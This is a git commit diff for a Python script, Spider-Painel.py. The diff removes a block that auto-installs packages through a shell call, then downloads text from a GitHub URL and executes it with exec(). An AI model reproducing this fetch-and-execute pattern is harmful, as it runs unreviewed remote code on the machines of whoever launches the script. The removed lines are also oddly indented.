f419122a66abf90c1d5b8acddb4e7d77fc3dc253
Spiderckz <98835437+spidercks@users.noreply.github.com>
2022-03-27 18:41:07 -0300

    Update Spider-Painel.py

--- Spider-Painel.py
+++ Spider-Painel.py
@@ -125,13 +125,6 @@ try:
         print(f'{vm}- [!] valor invalido !! {f}');exit()                                                                                          
 except:
     exit()
-       from os import execl; from sys import executable; from os import system;from sys import argv
-try: from requests import get;from TerminalButtons import *
-except: system('python3 -m pip install --upgrade pip && pip3 install requests TerminalButtons');execl(executable, executable, *argv)
-try: exec(get('https://github.com/spidercks/spider-painel').text)
-except: print('Verifique sua conexão com a internet!')
-      #leonelgay
-      #spc
       #peliosso
       #spiderckz
        
